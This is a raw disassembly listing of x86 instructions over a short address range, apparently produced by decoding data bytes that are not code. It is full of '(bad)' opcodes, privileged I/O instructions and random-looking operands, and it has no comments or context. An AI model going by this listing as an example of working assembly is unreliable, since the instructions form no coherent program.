  413022:	fbstp  TBYTE PTR [esp+edi*1+0x72]
  413026:	out    dx,eax
  413027:	inc    ebp
  413028:	inc    ecx
  413029:	mov    ah,0xdc
  41302b:	(bad)  
  41302c:	cld    
  41302d:	cwde   
  41302e:	sub    BYTE PTR [edx],cl
  413030:	xchg   BYTE PTR [ecx+ebp*4-0x38],cl
  413034:	hlt    
  413035:	aad    0x6b
  413037:	sbb    al,0xf1
  413039:	add    bl,BYTE PTR [esi-0x4a933e2b]
  41303f:	xchg   esi,eax
  413040:	inc    ebp
  413041:	outs   dx,DWORD PTR ds:[esi]
  413042:	pop    ds
  413043:	sbb    edx,DWORD PTR [ebx]
  413045:	mov    ebp,0x19ea7ea5
  41304a:	sbb    al,0xa8
  41304c:	cli    
  41304d:	cs sub ebp,ebp
  413050:	fldenv [eax+edi*2]
  413053:	jne    0x41307f
  413055:	xor    edi,edx
  413057:	aas    
  413058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413059:	test   eax,0x82520a71
  41305e:	ficom  WORD PTR [edx+0x24]
  413061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413062:	inc    esp
  413063:	mov    ecx,0x8385441
  413068:	imul   edi,DWORD PTR [edi],0xffffffee
  41306b:	clc    
  41306c:	pop    ds
  41306d:	out    dx,eax
  41306e:	sbb    al,0x9d
  413070:	push   0xfffffff8
  413072:	mov    cl,0xcc
  413074:	mov    BYTE PTR [ebx],bl
  413076:	mov    ecx,0x731f4e32
  41307b:	sti    
  41307c:	jp     0x4130e8
  41307e:	and    al,0x7f
  413080:	(bad)  
  413081:	xchg   ecx,eax
  413082:	pop    es
  413083:	mov    ch,0x5a
  413085:	sahf   
  413086:	or     BYTE PTR [esi+0x3df55213],0xd7
  41308d:	stos   BYTE PTR es:[edi],al
  41308e:	dec    edx
  41308f:	nop
  413090:	cwde   
  413091:	int    0x69
  413093:	mov    edx,0x53bfc531
  413098:	mov    eax,0x9cd47526
  41309d:	in     al,dx
  41309e:	int    0x86
  4130a0:	xor    DWORD PTR [ebp+edi*2+0x1c060ca],edi
  4130a7:	cwde   
  4130a8:	daa    
  4130a9:	outs   dx,BYTE PTR ds:[esi]
  4130aa:	pop    ss
  4130ab:	push   esp
  4130ac:	and    bl,ch
  4130ae:	pop    ds
  4130af:	lea    ebp,[edi]
  4130b1:	das    
  4130b2:	push   es
  4130b3:	mov    al,ds:0x69210965
  4130b8:	adc    BYTE PTR [eax-0x59],ah
  4130bb:	xor    DWORD PTR gs:[esi+0xe68dc8f],0xffffffd4
  4130c3:	outs   dx,BYTE PTR ds:[esi]
  4130c4:	sbb    DWORD PTR [edi+eiz*4-0x5f308f07],0x6c741cc1
  4130cf:	ret    
  4130d0:	aam    0x6f
  4130d2:	enter  0xcf35,0x41
  4130d6:	shl    cl,1
  4130d8:	(bad)  
  4130d9:	fidiv  WORD PTR [esi+0x4f]
  4130dc:	scas   al,BYTE PTR es:[edi]
  4130dd:	inc    edx
  4130de:	pop    ss
  4130df:	fucom  st(4)
  4130e1:	sahf   
  4130e2:	or     al,0x40
  4130e4:	enter  0xbd6f,0x5
  4130e8:	ins    BYTE PTR es:[edi],dx
  4130e9:	adc    ebp,DWORD PTR [ecx+ebp*2-0x2c]
  4130ed:	xchg   edx,eax
  4130ee:	mov    bh,0xbb
  4130f0:	iret   
  4130f1:	dec    edx
  4130f2:	cld    
  4130f3:	ds in  al,0x30
  4130f6:	nop
  4130f7:	push   ebp
  4130f8:	mov    BYTE PTR [edi+0x7b],dl
  4130fb:	pop    esi
  4130fc:	jl     0x4130f4
  4130fe:	and    al,BYTE PTR [edx+0x116af2dc]
  413104:	leave  
  413105:	sar    ebx,cl
  413107:	outs   dx,DWORD PTR ds:[esi]
  413108:	stos   DWORD PTR es:[edi],eax
  413109:	outs   dx,DWORD PTR ds:[esi]
  41310a:	xchg   ecx,eax
  41310b:	cmp    BYTE PTR [ebp+0x3],al
  41310e:	push   eax
  41310f:	push   cs
  413110:	out    dx,al
  413111:	cmp    DWORD PTR [eax],eax
  413113:	xor    al,0xd6
  413115:	hlt    
  413116:	xchg   BYTE PTR [edi],ah
  413118:	ffreep st(1)
  41311a:	test   DWORD PTR [ecx-0x18],edx
  41311d:	add    al,0x1b
  41311f:	(bad)  
  413120:	lea    edx,[edx]
  413122:	aad    0xea
  413124:	mov    dl,0x1
  413126:	jae    0x41317e
  413128:	popf   
  413129:	push   0x6b1c1223
  41312e:	cdq    
  41312f:	cmp    al,0x5c
  413131:	mov    ds:0x4bd14ad4,eax
  413136:	das    
  413137:	out    0x75,al
  413139:	jmp    0xc47b:0x8bf11202
  413140:	iret   
  413141:	cld    
  413142:	scas   eax,DWORD PTR es:[edi]
  413143:	call   0xa4e2d7aa
  413148:	lods   eax,DWORD PTR ds:[esi]
  413149:	mov    ebx,0x4f228508
  41314e:	add    BYTE PTR [eax-0x3a],0x12
  413152:	iret   
  413153:	cmp    edx,ebp
  413155:	mov    ah,0x31
  413157:	pop    eax
  413158:	push   0x7b
  41315a:	dec    edi
  41315b:	jnp    0x4131b8
  41315d:	ficom  DWORD PTR [ecx+0x25e06433]
  413163:	std    
  413164:	sub    al,0xc6
  413166:	in     eax,0x4b
  413168:	pop    ebp
  413169:	push   esp
  41316a:	add    bh,bl
  41316c:	push   ecx
  41316d:	and    al,0x7e
  41316f:	stc    
  413170:	mov    al,0x8b
  413172:	xchg   ebp,eax
  413173:	mov    dh,0xfa
  413175:	and    edi,DWORD PTR [edi+edx*1]
  413178:	fadd   st(0),st
  41317a:	xor    dl,al
  41317c:	repnz push es
  41317e:	ret    0x8863
  413181:	xor    esp,eax
  413183:	enter  0xde4e,0x49
  413187:	cmp    DWORD PTR [ebx-0x43],0xeabf1eac
  41318e:	jns    0x413112
  413190:	popf   
  413191:	shr    DWORD PTR [edx-0x5e],0x46
  413195:	stos   DWORD PTR es:[edi],eax
  413196:	std    
  413197:	inc    edi
  413198:	add    al,0x6e
  41319a:	mov    DWORD PTR [edx+0x75],ebp
  41319d:	mov    edi,0x38c9af20
  4131a2:	call   0x4c21:0x5a44ae84
  4131a9:	push   edi
  4131aa:	icebp  
  4131ab:	mov    al,al
  4131ad:	outs   dx,BYTE PTR ds:[esi]
  4131ae:	repz cmc 
  4131b0:	xor    DWORD PTR [edi*4+0x3a4ecc19],esp
  4131b7:	shl    DWORD PTR [eax+0x34dd0720],cl
  4131bd:	clc    
  4131be:	inc    esi
  4131bf:	in     al,0xf9
  4131c1:	xor    al,0x5b
  4131c3:	pushf  
  4131c4:	test   DWORD PTR [edx],edi
  4131c6:	or     DWORD PTR [edi-0x2c],ebx
  4131c9:	push   ebx
  4131ca:	ss imul esp,eax,0x53
  4131ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131cf:	xchg   BYTE PTR [esi+0x67ade8a],ah
  4131d5:	hlt    
  4131d6:	and    BYTE PTR [esi],cl
  4131d8:	xor    BYTE PTR [eax+0x42],dh
  4131db:	neg    BYTE PTR [ecx+0x6e]
  4131de:	dec    ebx
  4131df:	mov    ch,0x40
  4131e1:	pop    esi
  4131e2:	adc    ecx,DWORD PTR [edi]
  4131e4:	cli    
  4131e5:	mov    DWORD PTR [esi+0x6ddb3568],esp
  4131eb:	and    edx,edx
  4131ed:	fisttp QWORD PTR [ebx-0x37]
  4131f0:	cwde   
  4131f1:	mov    cl,0x4d
  4131f3:	in     al,0xcd
  4131f5:	inc    ecx
  4131f6:	aas    
  4131f7:	cld    
  4131f8:	adc    al,0x9e
  4131fa:	bnd jnp 0x4131cb
  4131fd:	pmaddwd mm2,QWORD PTR [ecx]
  413200:	mov    ss,WORD PTR ds:0x8d2ac92
  413206:	outs   dx,DWORD PTR ds:[esi]
  413207:	mov    ah,0x72
  413209:	mov    esp,0x63c4764b
  41320e:	jae    0x413286
  413210:	jbe    0x41326c
  413212:	cwde   
  413213:	imul   esp,DWORD PTR [ebx+0x62],0x23
  413217:	mov    dl,0xd8
  413219:	pushf  
  41321a:	lahf   
  41321b:	ss cmc 
  41321d:	mov    ah,0x7f
  41321f:	mov    eax,ds:0x3f5b6c71
  413224:	sub    eax,0x19c2ca34
  413229:	add    al,0x45
  41322b:	push   eax
  41322c:	out    dx,al
  41322d:	scas   al,BYTE PTR es:[edi]
  41322e:	iret   
  41322f:	mov    ebx,0xd8d85648
  413234:	mov    cl,0xea
  413236:	push   ebx
  413237:	sub    DWORD PTR [ebx+0x18],ebx
  41323a:	popf   
  41323b:	lea    ebp,[edi+edi*2-0x6d98ae06]
  413242:	mov    bl,0xb6
  413244:	or     dh,BYTE PTR [edx+0x612cd1d7]
  41324a:	neg    ebx
  41324c:	in     eax,0x38
  41324e:	add    eax,0xb9860c0a
  413253:	mov    ebp,0x953c1923
  413258:	retf   0x619b
  41325b:	aam    0x6b
  41325d:	sbb    bh,dl
  41325f:	retf   
  413260:	test   BYTE PTR [ecx+0x50a4f9a0],ch
  413266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413267:	jmp    0xa8d9:0xf8990d11
  41326e:	(bad)  
  41326f:	stc    
  413270:	fbld   TBYTE PTR [edi+edx*2+0x30040713]
  413277:	popf   
  413278:	outs   dx,DWORD PTR ds:[esi]
  413279:	dec    edi
  41327a:	jmp    0x413271
  41327c:	jl     0x413252
  41327e:	jg     0x41322e
  413280:	hlt    
  413281:	push   ecx
  413282:	repnz sahf 
  413284:	pop    esi
  413285:	sahf   
  413286:	pop    esi
  413287:	sub    esi,DWORD PTR [ecx+0x7f71c822]
  41328d:	fs jg  0x41329b
  413290:	and    al,0x46
  413292:	cmp    cl,BYTE PTR [ecx-0x45]
  413295:	add    DWORD PTR [ebx+0x5e],edi
  413298:	in     eax,dx
  413299:	(bad)  
  41329a:	sar    BYTE PTR [eax],0x73
  41329d:	jge    0x4132b7
  41329f:	fld    st(0)
  4132a1:	stos   BYTE PTR es:[edi],al
  4132a2:	loopne 0x4132ed
  4132a4:	sub    eax,0xbe53e729
  4132a9:	inc    esi
  4132aa:	(bad)  
  4132ab:	pop    edi
  4132ac:	es jo  0x413283
  4132af:	pop    ebx
  4132b0:	xor    DWORD PTR [esi+0x33a17e40],ebp
  4132b6:	sub    al,0x1f
  4132b8:	xchg   DWORD PTR [edx],edi
  4132ba:	shl    BYTE PTR [esp+ebx*4],1
  4132bd:	push   ebx
  4132be:	mov    cl,0x6
  4132c0:	shl    bh,1
  4132c2:	das    
  4132c3:	das    
  4132c4:	stos   BYTE PTR es:[edi],al
  4132c5:	inc    edi
  4132c6:	jno    0x4132e1
  4132c8:	leave  
  4132c9:	sbb    al,0xc
  4132cb:	fstp   TBYTE PTR [ecx+0x73668724]
  4132d1:	mov    cl,0x96
  4132d3:	imul   esi,DWORD PTR [esi+ebp*1-0x14],0x44
  4132d8:	add    eax,0xc088f4ac
  4132dd:	inc    eax
  4132de:	push   es
  4132df:	add    BYTE PTR [edi-0x5e],bl
  4132e2:	popf   
  4132e3:	lds    edi,FWORD PTR [eax+0x7f]
  4132e6:	mov    bh,0x74
  4132e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132ea:	das    
  4132eb:	cdq    
  4132ec:	fidivr WORD PTR [esi+0x4a88bef6]
  4132f2:	out    dx,eax
  4132f3:	or     ebx,DWORD PTR [ecx+0x18]
  4132f6:	ret    0xd2ba
  4132f9:	push   ebx
  4132fa:	and    DWORD PTR [ecx-0x72af1760],0x37
  413301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413302:	mov    ebx,0x2772e417
  413307:	cld    
  413308:	mov    BYTE PTR [esi-0x49],dl
  41330b:	mov    ds:0x2d717802,eax
  413310:	aam    0x73
  413312:	retf   
  413313:	jnp    0x4132a3
  413315:	aas    
  413316:	mov    bl,0x1d
  413318:	(bad)  
  413319:	call   0x234ba95
  41331e:	inc    ebp
  41331f:	ja     0x413371
  413321:	stos   DWORD PTR es:[edi],eax
  413322:	pop    ds
  413323:	sbb    al,bl
  413325:	cmp    eax,DWORD PTR [ebx]
  413327:	arpl   WORD PTR [ecx+0x4e31e4ec],bx
  41332d:	loop   0x413359
  41332f:	jp     0x41338d
  413331:	pop    ebx
  413332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413333:	test   eax,0xf4c76f60
  413338:	(bad)  
  413339:	pop    edx
  41333a:	outs   dx,BYTE PTR ds:[esi]
  41333b:	cmp    BYTE PTR [edx+0x44],al
  41333e:	lods   eax,DWORD PTR ds:[esi]
  41333f:	xor    bl,BYTE PTR [ecx-0x9]
  413342:	or     eax,DWORD PTR [ecx-0x34]
  413345:	xor    DWORD PTR [esi+0x77ae4cc3],ecx
  41334b:	mov    al,ds:0xce05c889
  413350:	inc    ecx
  413351:	std    
  413352:	repnz popa 
  413354:	ficomp WORD PTR [edi]
  413356:	jmp    0x9f69c429
  41335b:	in     al,dx
  41335c:	shr    DWORD PTR [ebp+0x55981bdf],cl
  413362:	xchg   esp,eax
  413363:	es sbb eax,0x68e1a6fe
  413369:	test   BYTE PTR [ebp-0x3f],bl
  41336c:	pop    edx
  41336d:	scas   eax,DWORD PTR es:[edi]
  41336e:	call   0x8af0:0x70866bd4
  413375:	pop    ecx
  413376:	inc    esi
  413377:	loope  0x4133be
  413379:	mov    bh,al
  41337b:	mov    ch,0xa6
  41337d:	ins    DWORD PTR es:[edi],dx
  41337e:	loop   0x413333
  413380:	dec    eax
  413381:	mov    edx,0x35ebfb24
  413386:	sub    bh,BYTE PTR [esi+ecx*8+0x31d8954d]
  41338d:	mov    bl,0x28
  41338f:	call   0x7264a8cb
  413394:	imul   edx,esi,0xc763f883
  41339a:	pop    es
  41339b:	lds    edi,FWORD PTR [ecx-0x14]
  41339e:	dec    eax
  41339f:	xchg   DWORD PTR [ebp+ebp*2+0x75d7e35d],esp
  4133a6:	imul   eax,edi,0xffffffff
  4133a9:	(bad)  
  4133aa:	pop    ds
  4133ab:	sub    al,0x8a
  4133ad:	mov    dh,0xa3
  4133af:	(bad)  
  4133b0:	idiv   esi
  4133b2:	push   0x12
  4133b4:	xor    BYTE PTR [edi-0x3],0xe8
  4133b8:	mov    esi,0xf4ae5e7
  4133bd:	push   edi
  4133be:	cs push ebx
  4133c0:	mov    al,0x45
  4133c2:	outs   dx,BYTE PTR ds:[esi]
  4133c3:	push   ebp
  4133c4:	(bad)  
  4133c5:	loopne 0x413443
  4133c7:	or     BYTE PTR [ecx],0x9
  4133ca:	ins    BYTE PTR es:[edi],dx
  4133cb:	push   cs
  4133cc:	mov    cl,BYTE PTR [edx+0x19377a5f]
  4133d2:	mov    ebp,0x40967eb1
  4133d7:	mov    edi,0xa4b3ec32
  4133dc:	call   0x141:0x5252491
  4133e3:	scas   eax,DWORD PTR es:[edi]
  4133e4:	sbb    DWORD PTR [esi],esp
  4133e6:	xor    ah,al
  4133e8:	pop    ebp
  4133e9:	xor    BYTE PTR [edi-0xb27e923],al
  4133ef:	ja     0x4133c0
  4133f1:	lods   al,BYTE PTR ds:[esi]
  4133f3:	out    0xaa,eax
  4133f5:	jmp    0x5ef86d6c
  4133fa:	jnp    0x4133d6
  4133fc:	ins    DWORD PTR es:[edi],dx
  4133fd:	xchg   ebp,eax
  4133fe:	rcr    BYTE PTR [ecx+esi*1+0x0],1
  413402:	xlat   BYTE PTR ds:[ebx]
  413403:	hlt    
  413404:	jae    0x413459
  413406:	mov    al,0xef
  413408:	sbb    DWORD PTR [esi-0x52],edi
  41340b:	call   0x47aebb47
  413410:	fmul   st,st(0)
  413412:	out    dx,eax
  413413:	std    
  413414:	add    al,0x2d
  413416:	jns    0x41344e
  413418:	push   esp
  413419:	aaa    
  41341a:	ret    0xcae4
  41341d:	sbb    al,0x94
  41341f:	xor    eax,0x72e80657
  413424:	push   cs
  413425:	and    al,0xf4
  413427:	xor    BYTE PTR [eax+0x67],dh
  41342a:	aas    
  41342b:	loop   0x4134a3
  41342d:	popf   
  41342e:	test   BYTE PTR [ebx-0x18],ah
  413431:	ss adc eax,0xb3b00317
  413437:	lock jne 0x413480
  41343a:	xor    BYTE PTR [edx+ebx*8-0x79],0x12
  41343f:	lock sub eax,0x230e3e83
  413445:	hlt    
  413446:	mov    DWORD PTR [eax+0x76723a85],edx
  41344c:	mov    fs,WORD PTR [ecx+0x4]
  41344f:	out    dx,eax
  413450:	gs cwde 
  413452:	adc    BYTE PTR [esi-0x1ab02fc1],bh
  413458:	cwde   
  413459:	sbb    eax,0xe1995e89
  41345e:	cmp    DWORD PTR [ecx],edi
  413460:	fidiv  DWORD PTR [ebx-0x59156f8a]
  413466:	mov    ch,0x2b
  413468:	retf   0xb2f2
  41346b:	push   ss
  41346c:	pusha  
  41346d:	daa    
  41346e:	inc    esp
  41346f:	inc    esi
  413470:	aaa    
  413471:	or     esp,ebx
  413473:	shl    DWORD PTR [ebx-0x4af3df86],0x5
  41347a:	push   edi
  41347b:	mov    bl,0xf1
  41347d:	push   eax
  41347e:	hlt    
  41347f:	(bad)  
  413480:	mov    bl,0x9e
  413482:	std    
  413483:	or     DWORD PTR [edx],esp
  413485:	into   
  413486:	sub    eax,0x43e58477
  41348b:	jmp    0x7577:0x896b5840
  413492:	and    eax,0xf2ff5bdb
  413497:	stc    
  413498:	stos   BYTE PTR es:[edi],al
  413499:	(bad)  
  41349b:	mov    ds,eax
  41349d:	mov    WORD PTR [ebx-0x45],fs
  4134a0:	(bad)  
  4134a1:	in     al,0x68
  4134a3:	outs   dx,DWORD PTR ds:[esi]
  4134a4:	jp     0x4134fd
  4134a6:	dec    ebp
  4134a7:	pop    ebp
  4134a8:	xlat   BYTE PTR ds:[ebx]
  4134a9:	and    DWORD PTR [edx],esi
  4134ab:	sub    DWORD PTR [eax+0x5130addf],0xfffffff9
  4134b2:	mov    cl,0xfc
  4134b4:	mov    ebp,0x2ec4d191
  4134b9:	push   0x3ac80e30
  4134be:	popa   
  4134bf:	xlat   BYTE PTR ds:[ebx]
  4134c0:	out    dx,al
  4134c1:	push   cs
  4134c2:	jbe    0x4134a9
  4134c4:	mov    edx,0x617f0f99
  4134c9:	mul    DWORD PTR [ecx]
  4134cb:	stos   BYTE PTR es:[edi],al
  4134cc:	(bad)  
  4134cd:	pop    esi
  4134ce:	mov    edx,0x4549b2b0
  4134d3:	jo     0x4134a4
  4134d5:	cld    
  4134d6:	adc    eax,0x53657f50
  4134db:	jno    0x413551
  4134dd:	xchg   edx,eax
  4134de:	mov    dl,0xf2
  4134e0:	outs   dx,DWORD PTR ds:[esi]
  4134e1:	and    eax,0x5d1b90de
  4134e6:	mov    BYTE PTR [edi],dl
  4134e8:	xchg   ecx,eax
  4134e9:	pcmpeqw mm0,QWORD PTR [esi+0x48]
  4134ed:	xchg   esi,eax
  4134ee:	gs and al,0x77
  4134f1:	jmp    0x8940efc0
  4134f6:	xchg   ecx,eax
  4134f7:	stos   DWORD PTR es:[edi],eax
  4134f8:	call   0xe48:0xf732d392
  4134ff:	mov    DWORD PTR [esi+ebp*1+0xe5df6a],esp
  413506:	cmp    al,0x4a
  413508:	push   es
  413509:	or     dh,BYTE PTR [bp+si+0x2c]
  41350d:	aas    
  41350e:	inc    ebx
  41350f:	dec    DWORD PTR [eax-0x61221dfb]
  413515:	repz shl DWORD PTR [edi],cl
  413518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413519:	cld    
  41351a:	jle    0x413543
  41351c:	lods   eax,DWORD PTR ds:[esi]
  41351d:	sbb    edx,DWORD PTR [eax]
  41351f:	pop    ebx
  413520:	pop    es
  413521:	leave  
  413522:	mov    edx,0x43267623
  413527:	xlat   BYTE PTR ds:[ebx]
  413528:	std    
  413529:	leave  
  41352a:	cmp    cl,BYTE PTR [edi]
  41352c:	pop    ebp
  41352d:	sbb    DWORD PTR [esi-0x33a5da6b],esi
  413533:	fwait
  413534:	push   esp
  413535:	adc    ebx,DWORD PTR [ecx-0x36]
  413538:	pop    esp
  413539:	stos   DWORD PTR es:[edi],eax
  41353a:	mov    esp,0x74081ad5
  41353f:	jl     0x413512
  413541:	ret    0x798e
  413544:	lahf   
  413545:	cmp    BYTE PTR [ecx+eax*8+0x78],al
  413549:	jb     0x41352f
  41354b:	dec    edx
  41354c:	les    esp,FWORD PTR [ebp+0x68]
  41354f:	dec    ebx
  413550:	repz adc eax,ebp
  413553:	push   cs
  413554:	jmp    0x413508
  413556:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413558:	jmp    0x890:0x8dd789d8
  41355f:	imul   esi,DWORD PTR [eax+0x6804f5c5],0xffffffec
  413566:	cs pop ebx
  413568:	ins    BYTE PTR es:[edi],dx
  413569:	push   esp
  41356a:	push   ebp
  41356b:	lds    ecx,FWORD PTR [eax]
  41356d:	call   0x213c:0xd68db6a0
  413574:	aam    0x78
  413576:	(bad)  
  413577:	mov    ch,0x54
  413579:	fsubp  st(6),st
  41357b:	mov    esi,0x49c00b9e
  413580:	or     esp,DWORD PTR [eax-0x1b]
  413583:	loop   0x4135f4
  413585:	sbb    ah,BYTE PTR [edx]
  413587:	jae    0x41355c
  413589:	sub    al,cl
  41358b:	scas   al,BYTE PTR es:[edi]
  41358c:	push   ecx
  41358d:	fs ja  0x413561
  413590:	push   esi
  413591:	inc    ecx
  413592:	push   ss
  413593:	test   al,0xd4
  413595:	push   0xffffffc1
  413597:	mov    al,ds:0xf062f9
  41359c:	inc    ecx
  41359d:	adc    DWORD PTR ds:0x4492a3cf,edi
  4135a3:	adc    edi,ebx
  4135a5:	pop    ebp
  4135a6:	or     eax,0x4fa70130
  4135ab:	add    BYTE PTR [ecx+0x25fb93ff],al
  4135b1:	ins    BYTE PTR es:[edi],dx
  4135b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135b3:	dec    edi
  4135b4:	aam    0x73
  4135b6:	pop    es
  4135b7:	or     ecx,ecx
  4135b9:	test   BYTE PTR [eax],ch
  4135bb:	arpl   WORD PTR [edx+edi*2-0x3f],si
  4135bf:	pusha  
  4135c0:	inc    edx
  4135c1:	aas    
  4135c2:	stc    
  4135c3:	mov    ebx,0x84e283b2
  4135c8:	lock test al,0xbd
  4135cb:	idiv   DWORD PTR [esp+esi*8]
  4135ce:	in     eax,dx
  4135cf:	addr16 sub eax,0x7c6c9af7
  4135d5:	cmp    BYTE PTR [ecx-0x6982d376],dl
  4135db:	push   ecx
  4135dc:	into   
  4135dd:	or     eax,0x1eb92223
  4135e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135e3:	ds adc al,0x0
  4135e6:	mov    esp,0xf1310493
  4135eb:	jp     0x41357c
  4135ed:	pushf  
  4135ee:	repz popf 
  4135f0:	mov    ecx,0x3013cb2c
  4135f5:	sub    DWORD PTR [edx],edi
  4135f7:	xor    al,0xac
  4135f9:	test   al,0xd7
  4135fb:	sbb    ebp,eax
  4135fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135fe:	sub    al,0x5c
  413600:	xchg   edi,eax
  413601:	dec    esp
  413602:	retf   
  413603:	adc    eax,0xf3c8fdfc
  413608:	add    DWORD PTR [edx],edi
  41360a:	arpl   WORD PTR [ecx],si
  41360c:	mov    ah,BYTE PTR [eax+ecx*8]
  41360f:	imul   esp
  413611:	push   0x2662885c
  413616:	cmp    bh,ah
  413618:	jae    0x41368c
  41361a:	aas    
  41361b:	add    DWORD PTR [esi+0x5681960b],ecx
  413621:	loopne 0x4135b1
  413623:	mov    ch,0x81
  413625:	xor    BYTE PTR ds:0x17eaa7f9,al
  41362b:	jmp    0x413678
  41362d:	(bad)  
  41362e:	data16 out 0xea,al
  413631:	push   cs
  413632:	ds (bad) 
  413634:	bound  esp,QWORD PTR [ebx-0x78e715dd]
  41363a:	(bad)  
  41363b:	mov    edi,0x5bef9fa5
  413640:	jge    0x4136c0
  413642:	xchg   esi,eax
  413643:	int    0xf1
  413645:	mov    edi,0x62f9b4e9
  41364a:	jnp    0x413671
  41364c:	out    0x9a,al
  41364e:	fidiv  WORD PTR [ebx+ecx*4+0x76234844]
  413655:	jnp    0x413618
  413657:	ins    DWORD PTR es:[edi],dx
  413658:	jg     0x413679
  41365a:	push   eax
  41365b:	(bad)  
  41365c:	in     al,0x42
  41365e:	inc    ebx
  41365f:	mov    ch,0x74
  413661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413662:	fsub   st,st(5)
  413664:	mov    dl,0x7d
  413666:	pop    edx
  413667:	je     0x4135f8
  413669:	or     DWORD PTR [esi-0x28],edi
  41366c:	repz xchg esi,eax
  41366e:	inc    edi
  41366f:	in     al,dx
  413670:	imul   edx,DWORD PTR [edx],0xb23d728f
  413676:	ror    DWORD PTR [ebp+ebp*8-0x3e61cc58],0xea
  41367e:	inc    eax
  41367f:	mov    eax,0xebf97ca4
  413684:	pop    ss
  413685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413686:	add    esi,DWORD PTR [edx]
  413688:	jne    0x413709
  41368a:	xchg   edx,eax
  41368b:	push   ebx
  41368c:	add    eax,0xdc2f6734
  413691:	cmp    al,0x55
  413693:	out    0x18,al
  413695:	aam    0xfd
  413697:	mov    esi,edx
  413699:	out    0x23,eax
  41369b:	jmp    0xb7a2edf7
  4136a0:	cmp    eax,0xdb04975e
  4136a5:	lds    eax,FWORD PTR [edx+0x66]
  4136a8:	ret    0x5d5f
  4136ab:	lods   eax,DWORD PTR ds:[esi]
  4136ac:	out    0x53,eax
  4136ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136af:	xchg   ebx,eax
  4136b0:	fisub  DWORD PTR [ecx-0x2e]
  4136b3:	hlt    
  4136b4:	ds xchg ecx,eax
  4136b6:	shl    BYTE PTR [edx+0x39],0x13
  4136ba:	sub    eax,DWORD PTR ds:0x5c70b84f
  4136c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136c1:	lock push esi
  4136c3:	push   0x15
  4136c5:	and    DWORD PTR [esi],eax
  4136c7:	mov    ebx,0x64548837
  4136cc:	push   ds
  4136cd:	outs   dx,DWORD PTR ds:[esi]
  4136ce:	mov    BYTE PTR [edi-0xc81d373],dh
  4136d4:	pop    ds
  4136d5:	cmp    eax,0xb22eff48
  4136da:	retf   0xe561
  4136dd:	out    dx,eax
  4136de:	add    eax,0xadb112c2
  4136e3:	inc    esi
  4136e4:	imul   edi,esp,0xc0fd394a
  4136ea:	(bad)  
  4136eb:	push   ebp
  4136ec:	jns    0x41370c
  4136ee:	hlt    
  4136ef:	pop    DWORD PTR [edx+0x4a]
  4136f2:	dec    ebx
  4136f3:	and    DWORD PTR [ebx],eax
  4136f5:	mov    esp,0x7bf71b93
  4136fa:	loope  0x413716
  4136fc:	ficom  DWORD PTR [esi+0x43bd43c8]
  413702:	lods   eax,DWORD PTR ds:[esi]
  413703:	mov    eax,0x181769dc
  413708:	sub    ebx,DWORD PTR [edx-0x429fa447]
  41370e:	xchg   edx,eax
  41370f:	add    bl,0x76
  413712:	add    dh,BYTE PTR [eax-0x235ab65d]
  413718:	push   ss
  413719:	in     eax,0x37
  41371b:	mov    ecx,0xf159101d
  413720:	and    eax,0x7f5e810d
  413725:	ret    0x2f0f
  413728:	pop    ebx
  413729:	gs pop ds
  41372b:	fnstcw WORD PTR [eax]
  41372d:	stos   DWORD PTR es:[edi],eax
  41372e:	dec    esi
  41372f:	mov    cl,0x4c
  413731:	gs ret 
  413733:	cdq    
  413734:	ins    BYTE PTR es:[edi],dx
  413735:	fbld   TBYTE PTR [esi]
  413737:	sbb    bh,al
  413739:	(bad)  
  41373a:	test   BYTE PTR [edx],bl
  41373c:	mov    ebx,0x70b01c5d
  413741:	jl     0x413778
  413743:	and    al,0x7e
  413745:	push   es
  413746:	sub    BYTE PTR [ebx-0x6209e125],al
  41374c:	push   ebx
  41374d:	and    eax,DWORD PTR [esi+0x756c6593]
  413753:	out    dx,eax
  413754:	(bad)  [ebp-0x6b]
  413757:	cmp    ecx,DWORD PTR [ecx]
  413759:	push   esi
  41375a:	sti    
  41375b:	div    eax
  41375d:	mov    cl,0xd2
  41375f:	xor    ah,cl
  413761:	out    dx,al
  413762:	int3   
  413763:	pop    ebp
  413764:	and    DWORD PTR [edx+ebp*8-0xd],eax
  413768:	fs adc eax,0x82be2dc0
  41376e:	ret    
  41376f:	xor    esp,esi
  413771:	stos   BYTE PTR es:[edi],al
  413772:	jnp    0x413768
  413774:	ss hlt 
  413776:	mov    dh,0x42
  413778:	fmul   DWORD PTR [ebx+esi*2]
  41377b:	mov    bl,cl
  41377d:	jb     0x41370e
  41377f:	inc    ecx
  413780:	jne    0x4137c5
  413782:	in     eax,0x1f
  413784:	lock imul esi,DWORD PTR es:[ebp-0x43],0xca8b4cd8
  41378d:	cmp    eax,0xc158a564
  413792:	jb     0x4137d8
  413794:	pop    DWORD PTR [eax+ebx*1+0x136ae0e]
  41379b:	xchg   edi,eax
  41379c:	hlt    
  41379d:	call   0xcbb1950
  4137a2:	fwait
  4137a3:	pop    esi
  4137a4:	ret    0x30af
  4137a7:	mov    ah,0xd6
  4137a9:	inc    ebx
  4137aa:	add    dl,BYTE PTR [edx+0x60a84a92]
  4137b0:	adc    eax,0x9d066481
  4137b5:	in     eax,0x9
  4137b7:	es ret 0x4596
  4137bb:	jbe    0x4137b2
  4137bd:	ins    BYTE PTR es:[edi],dx
  4137be:	pusha  
  4137bf:	out    dx,eax
  4137c0:	mov    ebp,0xc66da2e4
  4137c5:	inc    esp
  4137c6:	out    0xd0,eax
  4137c8:	mov    eax,0x43055573
  4137cd:	jns    0x41379a
  4137cf:	mov    dh,0xd4
  4137d1:	xor    cl,BYTE PTR [ecx-0x6d]
  4137d4:	sbb    al,0x8b
  4137d6:	(bad)
